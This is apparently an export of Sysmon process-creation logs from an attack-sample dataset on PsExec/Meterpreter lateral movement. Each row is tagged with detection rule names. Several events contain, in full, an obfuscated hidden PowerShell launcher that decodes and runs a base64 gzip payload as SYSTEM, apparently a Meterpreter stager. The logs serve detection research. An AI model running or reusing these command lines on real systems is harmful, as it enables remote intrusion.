CommandLine: C:\Windows\system32\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c ""if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAIuvyFwCA7VW+2/aSBD+OZH6P1gVErZCMA60aSJVujVPE5xADITHodNir+0lay/Ya169/u83Btym1/SuPeksHruzM7Mz33w7azcJbUF5KM2DxU1J+vTm/KyLIxxIco6MClKOmsrZGQhz5Er6KMlTtFzWeIBpOLu9rSZRREJxnBebRKA4JsGcURLLivSn9OSTiFw+zBfEFtInKfdHscn4HLOT2q6KbZ9Ilyh00rUOt3EaSdFaMirk/O+/55XppTYr1lcJZrGct3axIEHRYSyvSJ+VdMP+bknkvEntiMfcFcUnGpavioMwxi65B29rYhLhcyfOK5ADfCIikiiUIJvU/Lgo52HYjbiNHCcicZwvSNPU8XQ2+02ennZ9TEJBA1I0QkEivrRItKY2iYstHDqMPBJ3BlaWiGjozRQF1Nb8mci5MGGsIP2KG/mebDLMftZIfmkEWl0RKYW0gn/P0uROwsjRLv9KmFBzBZ5j3QGyz2/O35y7GUVWdyP6kiEwOpsexgQCk7s8pge9j1KpIJmwCRY82sE0148Sosy+wCrl3Gbhx9ZapgqKfP+0BdF0yKkzA5NTHXMbkUp/zMYacWlIarsQB9TOCCe/Bi5xGTnkV8zU7iEkOX9aIE6NMOJhkQKW1vg7s3pAxRdbPaHMIRGyoUAxRAW1U74N5lgDOW+EJgkAn+McSJdzgeYk0z5Re5ftns5BKV9lOI4LUjeBc2YXJItgRpyChMKYnpZQIvhhmP8arpkwQW0ci8zdTDmieNqtysNYRIkNBYPM+9aS2BSzFIiC1KIO0XcW9bJd86/CUMWMAfvB0xrKAJI0fUukNIicNLumUrSIMIIlIwFoHA57g2EPjvaJ4QfWYI84+W+jyxh8pGuKQpb+i9igtBbjoiANaSSgY6SIpuz5L1u/6BQQRDUipwLI2ZmY6juRMjm3H6c8PKFxyD0SkHcj4oGOY/K+cuwJ8lv1gVYRPGMjZKatP1MNbahmmPAd0LLBa9fOXXvRUqPa1neRERtmq1vrtVqVddsaVoRVN8Rd1xBmfbRYWKj1OBiLiYFafVp6Hlf2yzbdWx3kjLfq+72+35T07X7hOe645rretWs9au8atPNU7emlK9yp1ZPOk77RS5W4TjetHh30ntsNMR8PGR64qjfSbjDddqLFUOPm3kCo6ZftfdsdNn3T2Y1blCzUUof2UA+hO/txMGh6S68ZI/VmuKoG3h1CRh8jA9WHu/Y7pvcGDR0N6noPP/Bu+aKmahNnVW9MRrgdMKfZUrXxCDkoUvuer10/+GGKE/b0lZ7qoM5k11BBp1tBrcoV3U9WvaaH6qAzDDjCDfo8uBiBz/s+2DwNNIcjERojVR16qodcyx9jpIO2vkINnVd3H7pmVx0Or3xt/qz5EDMZrT+YbXTRsLuqql4Ec/hVkW0ut+FI31yvvZbF7/AdHq4nZVXrb5ouWqGLC13T56JVL7fXsG9fvRl8fJtyB8iTc/f+5AUvftTATRzFPmbAF+jN2cls8Khx6rhdTlMLWT5ezs8kCgmDCw6uwIzliDFup83+0Jzhojm2//Q2GsCwfPXqSJG+KCpfr4FMdHs7gTDh3OzHxQ4JPeEXSttyqQRdvbStlCDJn0+sypc7GRwV0jvhgMvRLzv4VdKzlPMfh1Hlf4brdIZ9+HP+Da6vsn9Y/SkIS4Vjyt+JvxX8EqK/nvsTpgJULehDjBxvv9chOJHjxYvBoTRQfff0pK91D4m4vIcXhjfnfwFhhx3MPQoAAA==''))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);""
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\services.exe
UtcTime: 2019-04-30 20:26:51.949
"
2019-04-30T20:26:52.106089+00:00,Base64 Encoded PowerShell Command Detected;Gzip Archive Decode Via PowerShell;HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;Non Interactive PowerShell Process Spawned;Potential PowerShell Command Line Obfuscation;PowerShell Download Pattern;Suspicious FromBase64String Usage On Gzip Archive - Process Creation;Suspicious PowerShell Invocations - Specific - ProcessCreation;Suspicious SYSTEM User Process Creation;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Lateral Movement/LM_sysmon_psexec_smb_meterpreter.evtx,1,Microsoft-Windows-Sysmon,1,9808,IEWIN7,"Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
Description: Windows PowerShell
TerminalSessionId: 0
ParentCommandLine: C:\Windows\system32\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c ""if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAIuvyFwCA7VW+2/aSBD+OZH6P1gVErZCMA60aSJVujVPE5xADITHodNir+0lay/Ya169/u83Btym1/SuPeksHruzM7Mz33w7azcJbUF5KM2DxU1J+vTm/KyLIxxIco6MClKOmsrZGQhz5Er6KMlTtFzWeIBpOLu9rSZRREJxnBebRKA4JsGcURLLivSn9OSTiFw+zBfEFtInKfdHscn4HLOT2q6KbZ9Ilyh00rUOt3EaSdFaMirk/O+/55XppTYr1lcJZrGct3axIEHRYSyvSJ+VdMP+bknkvEntiMfcFcUnGpavioMwxi65B29rYhLhcyfOK5ADfCIikiiUIJvU/Lgo52HYjbiNHCcicZwvSNPU8XQ2+02ennZ9TEJBA1I0QkEivrRItKY2iYstHDqMPBJ3BlaWiGjozRQF1Nb8mci5MGGsIP2KG/mebDLMftZIfmkEWl0RKYW0gn/P0uROwsjRLv9KmFBzBZ5j3QGyz2/O35y7GUVWdyP6kiEwOpsexgQCk7s8pge9j1KpIJmwCRY82sE0148Sosy+wCrl3Gbhx9ZapgqKfP+0BdF0yKkzA5NTHXMbkUp/zMYacWlIarsQB9TOCCe/Bi5xGTnkV8zU7iEkOX9aIE6NMOJhkQKW1vg7s3pAxRdbPaHMIRGyoUAxRAW1U74N5lgDOW+EJgkAn+McSJdzgeYk0z5Re5ftns5BKV9lOI4LUjeBc2YXJItgRpyChMKYnpZQIvhhmP8arpkwQW0ci8zdTDmieNqtysNYRIkNBYPM+9aS2BSzFIiC1KIO0XcW9bJd86/CUMWMAfvB0xrKAJI0fUukNIicNLumUrSIMIIlIwFoHA57g2EPjvaJ4QfWYI84+W+jyxh8pGuKQpb+i9igtBbjoiANaSSgY6SIpuz5L1u/6BQQRDUipwLI2ZmY6juRMjm3H6c8PKFxyD0SkHcj4oGOY/K+cuwJ8lv1gVYRPGMjZKatP1MNbahmmPAd0LLBa9fOXXvRUqPa1neRERtmq1vrtVqVddsaVoRVN8Rd1xBmfbRYWKj1OBiLiYFafVp6Hlf2yzbdWx3kjLfq+72+35T07X7hOe645rretWs9au8atPNU7emlK9yp1ZPOk77RS5W4TjetHh30ntsNMR8PGR64qjfSbjDddqLFUOPm3kCo6ZftfdsdNn3T2Y1blCzUUof2UA+hO/txMGh6S68ZI/VmuKoG3h1CRh8jA9WHu/Y7pvcGDR0N6noPP/Bu+aKmahNnVW9MRrgdMKfZUrXxCDkoUvuer10/+GGKE/b0lZ7qoM5k11BBp1tBrcoV3U9WvaaH6qAzDDjCDfo8uBiBz/s+2DwNNIcjERojVR16qodcyx9jpIO2vkINnVd3H7pmVx0Or3xt/qz5EDMZrT+YbXTRsLuqql4Ec/hVkW0ut+FI31yvvZbF7/AdHq4nZVXrb5ouWqGLC13T56JVL7fXsG9fvRl8fJtyB8iTc/f+5AUvftTATRzFPmbAF+jN2cls8Khx6rhdTlMLWT5ezs8kCgmDCw6uwIzliDFup83+0Jzhojm2//Q2GsCwfPXqSJG+KCpfr4FMdHs7gTDh3OzHxQ4JPeEXSttyqQRdvbStlCDJn0+sypc7GRwV0jvhgMvRLzv4VdKzlPMfh1Hlf4brdIZ9+HP+Da6vsn9Y/SkIS4Vjyt+JvxX8EqK/nvsTpgJULehDjBxvv9chOJHjxYvBoTRQfff0pK91D4m4vIcXhjfnfwFhhx3MPQoAAA==''))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);""
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3348
LogonGuid: 365ABB72-2586-5CC9-0000-0020E7030000
Hashes: SHA1=04C5D2B4DA9A0F3FA8A45702D4256CEE42D8C48D,MD5=92F44E405DB16AC55D97E3BFE3B132FA,SHA256=6C05E11399B7E3C8ED31BAE72014CF249C144A8F4A2C54A758EB2E6FAD47AEC7,IMPHASH=96BA691B035D05F44E35AB23F6BA946C
ParentProcessGuid: 365ABB72-AF8B-5CC8-0000-00101C1A1900
ProcessId: 3872
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-AF8B-5CC8-0000-0010AC1B1900
CommandLine: powershell.exe  -nop -w hidden -noni -c ""if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAIuvyFwCA7VW+2/aSBD+OZH6P1gVErZCMA60aSJVujVPE5xADITHodNir+0lay/Ya169/u83Btym1/SuPeksHruzM7Mz33w7azcJbUF5KM2DxU1J+vTm/KyLIxxIco6MClKOmsrZGQhz5Er6KMlTtFzWeIBpOLu9rSZRREJxnBebRKA4JsGcURLLivSn9OSTiFw+zBfEFtInKfdHscn4HLOT2q6KbZ9Ilyh00rUOt3EaSdFaMirk/O+/55XppTYr1lcJZrGct3axIEHRYSyvSJ+VdMP+bknkvEntiMfcFcUnGpavioMwxi65B29rYhLhcyfOK5ADfCIikiiUIJvU/Lgo52HYjbiNHCcicZwvSNPU8XQ2+02ennZ9TEJBA1I0QkEivrRItKY2iYstHDqMPBJ3BlaWiGjozRQF1Nb8mci5MGGsIP2KG/mebDLMftZIfmkEWl0RKYW0gn/P0uROwsjRLv9KmFBzBZ5j3QGyz2/O35y7GUVWdyP6kiEwOpsexgQCk7s8pge9j1KpIJmwCRY82sE0148Sosy+wCrl3Gbhx9ZapgqKfP+0BdF0yKkzA5NTHXMbkUp/zMYacWlIarsQB9TOCCe/Bi5xGTnkV8zU7iEkOX9aIE6NMOJhkQKW1vg7s3pAxRdbPaHMIRGyoUAxRAW1U74N5lgDOW+EJgkAn+McSJdzgeYk0z5Re5ftns5BKV9lOI4LUjeBc2YXJItgRpyChMKYnpZQIvhhmP8arpkwQW0ci8zdTDmieNqtysNYRIkNBYPM+9aS2BSzFIiC1KIO0XcW9bJd86/CUMWMAfvB0xrKAJI0fUukNIicNLumUrSIMIIlIwFoHA57g2EPjvaJ4QfWYI84+W+jyxh8pGuKQpb+i9igtBbjoiANaSSgY6SIpuz5L1u/6BQQRDUipwLI2ZmY6juRMjm3H6c8PKFxyD0SkHcj4oGOY/K+cuwJ8lv1gVYRPGMjZKatP1MNbahmmPAd0LLBa9fOXXvRUqPa1neRERtmq1vrtVqVddsaVoRVN8Rd1xBmfbRYWKj1OBiLiYFafVp6Hlf2yzbdWx3kjLfq+72+35T07X7hOe645rretWs9au8atPNU7emlK9yp1ZPOk77RS5W4TjetHh30ntsNMR8PGR64qjfSbjDddqLFUOPm3kCo6ZftfdsdNn3T2Y1blCzUUof2UA+hO/txMGh6S68ZI/VmuKoG3h1CRh8jA9WHu/Y7pvcGDR0N6noPP/Bu+aKmahNnVW9MRrgdMKfZUrXxCDkoUvuer10/+GGKE/b0lZ7qoM5k11BBp1tBrcoV3U9WvaaH6qAzDDjCDfo8uBiBz/s+2DwNNIcjERojVR16qodcyx9jpIO2vkINnVd3H7pmVx0Or3xt/qz5EDMZrT+YbXTRsLuqql4Ec/hVkW0ut+FI31yvvZbF7/AdHq4nZVXrb5ouWqGLC13T56JVL7fXsG9fvRl8fJtyB8iTc/f+5AUvftTATRzFPmbAF+jN2cls8Khx6rhdTlMLWT5ezs8kCgmDCw6uwIzliDFup83+0Jzhojm2//Q2GsCwfPXqSJG+KCpfr4FMdHs7gTDh3OzHxQ4JPeEXSttyqQRdvbStlCDJn0+sypc7GRwV0jvhgMvRLzv4VdKzlPMfh1Hlf4brdIZ9+HP+Da6vsn9Y/SkIS4Vjyt+JvxX8EqK/nvsTpgJULehDjBxvv9chOJHjxYvBoTRQfff0pK91D4m4vIcXhjfnfwFhhx3MPQoAAA==''))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);""
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-04-30 20:26:51.965
"
2019-04-30T20:26:52.356089+00:00,Base64 Encoded PowerShell Command Detected;Gzip Archive Decode Via PowerShell;HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;Non Interactive PowerShell Process Spawned;Potential PowerShell Command Line Obfuscation;PowerShell Download Pattern;Suspicious FromBase64String Usage On Gzip Archive - Process Creation;Suspicious PowerShell Invocations - Specific - ProcessCreation;Suspicious SYSTEM User Process Creation;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Lateral Movement/LM_sysmon_psexec_smb_meterpreter.evtx,1,Microsoft-Windows-Sysmon,1,9809,IEWIN7,"Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
Description: Windows PowerShell
TerminalSessionId: 0
ParentCommandLine: powershell.exe  -nop -w hidden -noni -c ""if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAIuvyFwCA7VW+2/aSBD+OZH6P1gVErZCMA60aSJVujVPE5xADITHodNir+0lay/Ya169/u83Btym1/SuPeksHruzM7Mz33w7azcJbUF5KM2DxU1J+vTm/KyLIxxIco6MClKOmsrZGQhz5Er6KMlTtFzWeIBpOLu9rSZRREJxnBebRKA4JsGcURLLivSn9OSTiFw+zBfEFtInKfdHscn4HLOT2q6KbZ9Ilyh00rUOt3EaSdFaMirk/O+/55XppTYr1lcJZrGct3axIEHRYSyvSJ+VdMP+bknkvEntiMfcFcUnGpavioMwxi65B29rYhLhcyfOK5ADfCIikiiUIJvU/Lgo52HYjbiNHCcicZwvSNPU8XQ2+02ennZ9TEJBA1I0QkEivrRItKY2iYstHDqMPBJ3BlaWiGjozRQF1Nb8mci5MGGsIP2KG/mebDLMftZIfmkEWl0RKYW0gn/P0uROwsjRLv9KmFBzBZ5j3QGyz2/O35y7GUVWdyP6kiEwOpsexgQCk7s8pge9j1KpIJmwCRY82sE0148Sosy+wCrl3Gbhx9ZapgqKfP+0BdF0yKkzA5NTHXMbkUp/zMYacWlIarsQB9TOCCe/Bi5xGTnkV8zU7iEkOX9aIE6NMOJhkQKW1vg7s3pAxRdbPaHMIRGyoUAxRAW1U74N5lgDOW+EJgkAn+McSJdzgeYk0z5Re5ftns5BKV9lOI4LUjeBc2YXJItgRpyChMKYnpZQIvhhmP8arpkwQW0ci8zdTDmieNqtysNYRIkNBYPM+9aS2BSzFIiC1KIO0XcW9bJd86/CUMWMAfvB0xrKAJI0fUukNIicNLumUrSIMIIlIwFoHA57g2EPjvaJ4QfWYI84+W+jyxh8pGuKQpb+i9igtBbjoiANaSSgY6SIpuz5L1u/6BQQRDUipwLI2ZmY6juRMjm3H6c8PKFxyD0SkHcj4oGOY/K+cuwJ8lv1gVYRPGMjZKatP1MNbahmmPAd0LLBa9fOXXvRUqPa1neRERtmq1vrtVqVddsaVoRVN8Rd1xBmfbRYWKj1OBiLiYFafVp6Hlf2yzbdWx3kjLfq+72+35T07X7hOe645rretWs9au8atPNU7emlK9yp1ZPOk77RS5W4TjetHh30ntsNMR8PGR64qjfSbjDddqLFUOPm3kCo6ZftfdsdNn3T2Y1blCzUUof2UA+hO/txMGh6S68ZI/VmuKoG3h1CRh8jA9WHu/Y7pvcGDR0N6noPP/Bu+aKmahNnVW9MRrgdMKfZUrXxCDkoUvuer10/+GGKE/b0lZ7qoM5k11BBp1tBrcoV3U9WvaaH6qAzDDjCDfo8uBiBz/s+2DwNNIcjERojVR16qodcyx9jpIO2vkINnVd3H7pmVx0Or3xt/qz5EDMZrT+YbXTRsLuqql4Ec/hVkW0ut+FI31yvvZbF7/AdHq4nZVXrb5ouWqGLC13T56JVL7fXsG9fvRl8fJtyB8iTc/f+5AUvftTATRzFPmbAF+jN2cls8Khx6rhdTlMLWT5ezs8kCgmDCw6uwIzliDFup83+0Jzhojm2//Q2GsCwfPXqSJG+KCpfr4FMdHs7gTDh3OzHxQ4JPeEXSttyqQRdvbStlCDJn0+sypc7GRwV0jvhgMvRLzv4VdKzlPMfh1Hlf4brdIZ9+HP+Da6vsn9Y/SkIS4Vjyt+JvxX8EqK/nvsTpgJULehDjBxvv9chOJHjxYvBoTRQfff0pK91D4m4vIcXhjfnfwFhhx3MPQoAAA==''))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);""
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3872
LogonGuid: 365ABB72-2586-5CC9-0000-0020E7030000
Hashes: SHA1=04C5D2B4DA9A0F3FA8A45702D4256CEE42D8C48D,MD5=92F44E405DB16AC55D97E3BFE3B132FA,SHA256=6C05E11399B7E3C8ED31BAE72014CF249C144A8F4A2C54A758EB2E6FAD47AEC7,IMPHASH=96BA691B035D05F44E35AB23F6BA946C
ParentProcessGuid: 365ABB72-AF8B-5CC8-0000-0010AC1B1900
ProcessId: 2484
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-AF8C-5CC8-0000-001003361900
CommandLine: '""powershell.exe"" -noni -nop -w hidden -c &([scriptblock]::create((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAIuvyFwCA7VW+2/aSBD+OZH6P1gVErZCMA60aSJVujVPE5xADITHodNir+0lay/Ya169/u83Btym1/SuPeksHruzM7Mz33w7azcJbUF5KM2DxU1J+vTm/KyLIxxIco6MClKOmsrZGQhz5Er6KMlTtFzWeIBpOLu9rSZRREJxnBebRKA4JsGcURLLivSn9OSTiFw+zBfEFtInKfdHscn4HLOT2q6KbZ9Ilyh00rUOt3EaSdFaMirk/O+/55XppTYr1lcJZrGct3axIEHRYSyvSJ+VdMP+bknkvEntiMfcFcUnGpavioMwxi65B29rYhLhcyfOK5ADfCIikiiUIJvU/Lgo52HYjbiNHCcicZwvSNPU8XQ2+02ennZ9TEJBA1I0QkEivrRItKY2iYstHDqMPBJ3BlaWiGjozRQF1Nb8mci5MGGsIP2KG/mebDLMftZIfmkEWl0RKYW0gn/P0uROwsjRLv9KmFBzBZ5j3QGyz2/O35y7GUVWdyP6kiEwOpsexgQCk7s8pge9j1KpIJmwCRY82sE0148Sosy+wCrl3Gbhx9ZapgqKfP+0BdF0yKkzA5NTHXMbkUp/zMYacWlIarsQB9TOCCe/Bi5xGTnkV8zU7iEkOX9aIE6NMOJhkQKW1vg7s3pAxRdbPaHMIRGyoUAxRAW1U74N5lgDOW+EJgkAn+McSJdzgeYk0z5Re5ftns5BKV9lOI4LUjeBc2YXJItgRpyChMKYnpZQIvhhmP8arpkwQW0ci8zdTDmieNqtysNYRIkNBYPM+9aS2BSzFIiC1KIO0XcW9bJd86/CUMWMAfvB0xrKAJI0fUukNIicNLumUrSIMIIlIwFoHA57g2EPjvaJ4QfWYI84+W+jyxh8pGuKQpb+i9igtBbjoiANaSSgY6SIpuz5L1u/6BQQRDUipwLI2ZmY6juRMjm3H6c8PKFxyD0SkHcj4oGOY/K+cuwJ8lv1gVYRPGMjZKatP1MNbahmmPAd0LLBa9fOXXvRUqPa1neRERtmq1vrtVqVddsaVoRVN8Rd1xBmfbRYWKj1OBiLiYFafVp6Hlf2yzbdWx3kjLfq+72+35T07X7hOe645rretWs9au8atPNU7emlK9yp1ZPOk77RS5W4TjetHh30ntsNMR8PGR64qjfSbjDddqLFUOPm3kCo6ZftfdsdNn3T2Y1blCzUUof2UA+hO/txMGh6S68ZI/VmuKoG3h1CRh8jA9WHu/Y7pvcGDR0N6noPP/Bu+aKmahNnVW9MRrgdMKfZUrXxCDkoUvuer10/+GGKE/b0lZ7qoM5k11BBp1tBrcoV3U9WvaaH6qAzDDjCDfo8uBiBz/s+2DwNNIcjERojVR16qodcyx9jpIO2vkINnVd3H7pmVx0Or3xt/qz5EDMZrT+YbXTRsLuqql4Ec/hVkW0ut+FI31yvvZbF7/AdHq4nZVXrb5ouWqGLC13T56JVL7fXsG9fvRl8fJtyB8iTc/f+5AUvftTATRzFPmbAF+jN2cls8Khx6rhdTlMLWT5ezs8kCgmDCw6uwIzliDFup83+0Jzhojm2//Q2GsCwfPXqSJG+KCpfr4FMdHs7gTDh3OzHxQ4JPeEXSttyqQRdvbStlCDJn0+sypc7GRwV0jvhgMvRLzv4VdKzlPMfh1Hlf4brdIZ9+HP+Da6vsn9Y/SkIS4Vjyt+JvxX8EqK/nvsTpgJULehDjBxvv9chOJHjxYvBoTRQfff0pK91D4m4vIcXhjfnfwFhhx3MPQoAAA==''))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))'
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-04-30 20:26:52.356
"
